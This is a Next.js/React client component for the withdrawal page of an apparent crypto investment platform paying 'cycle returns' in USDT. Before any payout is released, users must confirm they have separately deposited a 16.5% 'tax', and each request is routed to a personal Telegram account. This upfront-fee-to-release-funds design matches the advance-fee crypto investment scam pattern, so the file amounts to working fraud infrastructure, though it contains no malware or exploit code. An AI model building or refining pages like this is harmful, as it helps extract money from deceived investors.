"use client"


import { Card } from "@/components/ui"
import * as React from "react"
import Link from "next/link"
import { useAuth } from "@/app/providers/auth-provider"
import { useCachedFetch, invalidateCache } from "@/lib/use-cached-fetch"
import { WITHDRAWAL_TAX_RATE, withdrawalTax } from "@/lib/trading"

interface WithdrawalRow {
  id: string
  amount: number
  tax: number
  status: string
  createdAt: string
}

interface WithdrawalsResponse {
  balance: { returns: number; withdrawn: number; available: number }
  minimum: number
  withdrawals: WithdrawalRow[]
}

export default function WithdrawPage() {
  const { user } = useAuth()
  const { data, loading, refresh } = useCachedFetch<WithdrawalsResponse>(user ? "/api/user/withdrawals" : null, { ttl: 30_000 })
  const balance = data?.balance
  const available = balance?.available ?? 0
  const minimum = data?.minimum ?? 50

  const [amount, setAmount] = React.useState("")
  const [address, setAddress] = React.useState("")
  const [network, setNetwork] = React.useState("TRC20")
  const [showConfirm, setShowConfirm] = React.useState(false)
  const [taxAcknowledged, setTaxAcknowledged] = React.useState(false)
  const [submitting, setSubmitting] = React.useState(false)
  const [error, setError] = React.useState("")
  const [success, setSuccess] = React.useState("")

  const withdrawAmount = amount ? parseFloat(amount) : 0
  // The 16.5% tax is settled up front by the client — it is never taken off the
  // payout, so what they request is exactly what they receive.
  const tax = withdrawalTax(withdrawAmount)
  const receiveAmount = withdrawAmount
  const taxPercent = `${(WITHDRAWAL_TAX_RATE * 100).toFixed(1)}%`

  const handleSubmit = async () => {
    setSubmitting(true)
    setError("")
    try {
      const res = await fetch("/api/user/withdrawals", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ amount: withdrawAmount, address, network, taxAcknowledged }),
      })
      const json = await res.json()
      if (!res.ok) {
        setError(json.error || "Couldn't submit your withdrawal")
        return
      }

      // Keep the Telegram hand-off so support sees the request immediately.
      const message = `💰 *Withdrawal Request*\n\n*Amount:* $${withdrawAmount}\n*Tax deposit (${taxPercent}):* $${tax.toFixed(2)} — settled before payout\n*You receive:* $${receiveAmount.toFixed(2)}\n*Network:* ${network}\n*Address:* ${address}\n*Reference:* ${json.withdrawal.id}`
      window.open(`https://t.me/khan_bashiri?text=${encodeURIComponent(message)}`, "_blank")

      setShowConfirm(false)
      setAmount("")
      setTaxAcknowledged(false)
      setSuccess(`Your $${withdrawAmount.toLocaleString()} withdrawal is pending. We'll email you once it's paid.`)
      invalidateCache("/api/user/")
      await refresh()
    } catch {
      setError("Network error. Please try again.")
    } finally {
      setSubmitting(false)
    }
  }

  const isValid =
    withdrawAmount >= minimum &&
    withdrawAmount <= available &&
    address.trim().length >= 20 &&
    taxAcknowledged

  return (
    <div className="space-y-4 sm:space-y-6">
      <div className="flex flex-col justify-between gap-3 sm:flex-row sm:items-center sm:gap-0">
        <div>
          <h1 className="text-xl font-semibold text-foreground sm:text-2xl">
            Withdraw
          </h1>
          <p className="mt-0.5 text-xs text-muted-foreground sm:text-sm">
            Transfer earnings to your wallet
          </p>
        </div>
        <Link
          href="/app"
          className="text-xs text-muted-foreground hover:text-foreground"
        >
          ← Back to Dashboard
        </Link>
      </div>

      <div className="grid grid-cols-1 gap-4 sm:gap-6 lg:grid-cols-3">
        <div className="lg:col-span-2">
          <Card className="p-4 sm:p-6">
            <h2 className="mb-4 text-base font-medium text-foreground sm:mb-6 sm:text-lg">
              Withdrawal Details
            </h2>

            <div className="mb-4 sm:mb-5">
              <div className="mb-1.5 flex items-center justify-between sm:mb-2">
                <label className="text-xs font-medium text-foreground sm:text-sm">
                  Amount (USDT)
                </label>
                <button
                  onClick={() => setAmount(String(available))}
                  disabled={available <= 0}
                  className="text-[10px] font-medium text-[oklch(0.62_0.12_178)] hover:opacity-80 disabled:opacity-40 sm:text-xs"
                >
                  Max: ${available.toLocaleString()}
                </button>
              </div>
              <input
                type="number"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                placeholder="0.00"
                className="w-full rounded-lg border border-border px-3 py-2.5 text-lg font-semibold text-foreground placeholder:text-muted-foreground focus:border-[oklch(0.21_0_0)] focus:outline-none sm:px-4 sm:py-3 sm:text-2xl"
              />
            </div>

            <div className="mb-4 sm:mb-5">
              <label className="mb-1.5 block text-xs font-medium text-foreground sm:mb-2 sm:text-sm">
                Wallet Address
              </label>
              <input
                type="text"
                value={address}
                onChange={(e) => setAddress(e.target.value)}
                placeholder="Enter your USDT address"
                className="w-full rounded-lg border border-border px-3 py-2.5 font-mono text-sm text-xs text-foreground placeholder:text-muted-foreground focus:border-[oklch(0.21_0_0)] focus:outline-none sm:px-4 sm:py-3 sm:text-sm"
              />
            </div>

            <div className="mb-4 sm:mb-5">
              <label className="mb-1.5 block text-xs font-medium text-foreground sm:mb-2 sm:text-sm">
                Network
              </label>
              <div className="grid grid-cols-3 gap-2">
                {["TRC20", "ERC20", "BEP20"].map((net) => (
                  <button
                    key={net}
                    onClick={() => setNetwork(net)}
                    className={`rounded-lg border px-2 py-2 text-[10px] font-medium transition-all sm:px-3 sm:py-2.5 sm:text-xs ${
                      network === net
                        ? "border-[oklch(0.21_0_0)] bg-[oklch(0.21_0_0)/8] text-foreground"
                        : "border-border text-muted-foreground hover:border-[oklch(0.21_0_0)/50]"
                    }`}
                  >
                    {net}
                  </button>
                ))}
              </div>
            </div>

            {withdrawAmount > 0 && (
              <div className="mb-4 space-y-2 rounded-lg bg-secondary/50 p-3 sm:mb-5 sm:space-y-3 sm:p-4">
                <div className="flex justify-between text-xs sm:text-sm">
                  <span className="text-muted-foreground">Amount</span>
                  <span className="font-medium text-foreground">
                    ${withdrawAmount.toLocaleString()}
                  </span>
                </div>
                <div className="flex justify-between text-xs sm:text-sm">
                  <span className="text-muted-foreground">
                    Tax deposit ({taxPercent}) — payable first
                  </span>
                  <span className="font-medium text-foreground">
                    ${tax.toLocaleString()}
                  </span>
                </div>
                <div className="flex justify-between border-t border-border pt-2 text-xs sm:pt-3 sm:text-sm">
                  <span className="font-medium text-foreground">
                    You receive
                  </span>
                  <span className="font-bold text-[oklch(0.62_0.12_178)]">
                    ${receiveAmount.toLocaleString()}
                  </span>
                </div>
              </div>
            )}

            <label className="mb-3 flex cursor-pointer items-start gap-2.5 rounded-lg border border-border p-3 sm:mb-4">
              <input
                type="checkbox"
                checked={taxAcknowledged}
                onChange={(e) => setTaxAcknowledged(e.target.checked)}
                className="mt-0.5 h-3.5 w-3.5 shrink-0 accent-[oklch(0.62_0.12_178)]"
              />
              <span className="text-[10px] leading-relaxed text-muted-foreground sm:text-xs">
                I have deposited the {taxPercent} tax
                {withdrawAmount > 0 ? ` ($${tax.toLocaleString()})` : ""} covering
                this withdrawal. It is paid separately and is never deducted from
                the amount I receive.
              </span>
            </label>

            {error && (
              <div className="mb-3 rounded-lg border border-destructive/25 bg-[var(--bg-danger)] p-3 text-xs text-destructive">{error}</div>
            )}
            {success && (
              <div className="mb-3 rounded-lg border border-[var(--color-success)]/25 bg-[var(--bg-success)] p-3 text-xs text-foreground">{success}</div>
            )}
            {!loading && available <= 0 && (
              <div className="mb-3 rounded-lg bg-secondary/50 p-3 text-xs text-muted-foreground">
                You have nothing to withdraw yet. Returns become withdrawable once a cycle completes.
              </div>
            )}
            {withdrawAmount > available && available > 0 && (
              <div className="mb-3 text-xs text-destructive">You can withdraw up to ${available.toLocaleString()}.</div>
            )}

            <button
              onClick={() => isValid && setShowConfirm(true)}
              disabled={!isValid}
              className="w-full rounded-lg bg-[oklch(0.21_0_0)] py-3 text-sm font-medium text-[oklch(1_0_180)] transition-opacity hover:opacity-90 disabled:cursor-not-allowed disabled:opacity-50 sm:py-4 sm:text-base"
            >
              Request withdrawal
            </button>
          </Card>
        </div>

        <div className="space-y-3 sm:space-y-4">
          <Card className="p-4 sm:p-5">
            <div className="mb-1 font-mono text-[10px] text-muted-foreground uppercase sm:text-xs">
              Available
            </div>
            <div className="text-2xl font-bold text-foreground sm:text-3xl">
              {loading ? "—" : `$${available.toLocaleString()}`}
            </div>
            <div className="mt-0.5 text-[10px] text-muted-foreground sm:text-xs">
              USDT · completed returns only
            </div>
            {balance && (
              <dl className="mt-3 space-y-1 border-t border-border pt-3 text-[10px] text-muted-foreground sm:text-xs">
                <div className="flex justify-between">
                  <dt>Returns paid to you</dt>
                  <dd className="text-foreground">${balance.returns.toLocaleString()}</dd>
                </div>
                <div className="flex justify-between">
                  <dt>Withdrawn or pending</dt>
                  <dd>-${balance.withdrawn.toLocaleString()}</dd>
                </div>
              </dl>
            )}
          </Card>

          <Card className="p-4 sm:p-5">
            <h3 className="mb-3 text-xs font-medium text-foreground sm:mb-4 sm:text-sm">
              Important
            </h3>
            <ul className="space-y-2 text-[10px] text-muted-foreground sm:space-y-3 sm:text-xs">
              {[
                `Min withdrawal: $${minimum} USDT`,
                "Only completed cycle returns can be withdrawn",
                `Tax: ${taxPercent}, deposited before the payout is released`,
                "You receive the full amount — nothing is deducted",
                "Processing: 24-48 hours",
              ].map((item, i) => (
                <li key={i} className="flex items-start gap-2">
                  <svg
                    className="mt-0.5 h-3.5 w-3.5 shrink-0 text-[oklch(0.62_0.12_178)] sm:h-4 sm:w-4"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="2"
                  >
                    <polyline points="20 6 9 17 4 12" />
                  </svg>
                  {item}
                </li>
              ))}
            </ul>
          </Card>
        </div>
      </div>

      {/* Confirmation Modal */}
      {showConfirm && (
        <div
          className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 p-4"
          onClick={() => setShowConfirm(false)}
        >
          <div
            className="w-full max-w-sm rounded-lg border border-border bg-card p-5"
            onClick={(e) => e.stopPropagation()}
          >
            <h3 className="mb-4 text-base font-semibold text-foreground">
              Confirm Withdrawal
            </h3>
            <div className="space-y-3 text-xs sm:text-sm">
              <div className="flex justify-between border-b border-border py-2">
                <span className="text-muted-foreground">Amount</span>
                <span className="font-medium text-foreground">
                  ${withdrawAmount.toLocaleString()}
                </span>
              </div>
              <div className="flex justify-between border-b border-border py-2">
                <span className="text-muted-foreground">
                  Tax ({taxPercent}) — paid separately
                </span>
                <span className="text-foreground">${tax.toLocaleString()}</span>
              </div>
              <div className="flex justify-between border-b border-border py-2">
                <span className="text-muted-foreground">Network</span>
                <span className="text-foreground">{network}</span>
              </div>
              <div className="border-b border-border py-2">
                <span className="mb-1 block text-xs text-muted-foreground">
                  Address
                </span>
                <span className="font-mono text-xs break-all text-foreground">
                  {address}
                </span>
              </div>
              <div className="flex justify-between py-2">
                <span className="font-medium text-foreground">You receive</span>
                <span className="font-bold text-[oklch(0.62_0.12_178)]">
                  ${receiveAmount.toLocaleString()}
                </span>
              </div>
            </div>
            <div className="mt-5 flex gap-2">
              <button
                onClick={() => setShowConfirm(false)}
                className="flex-1 rounded-lg border border-border py-2.5 text-sm font-medium text-foreground transition-colors hover:bg-secondary"
              >
                Cancel
              </button>
              <button
                onClick={handleSubmit}
                disabled={submitting}
                className="flex-1 rounded-lg bg-[oklch(0.21_0_0)] py-2.5 text-sm font-medium text-[oklch(1_0_180)] transition-opacity hover:opacity-90 disabled:opacity-50"
              >
                {submitting ? "Submitting…" : "Confirm"}
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
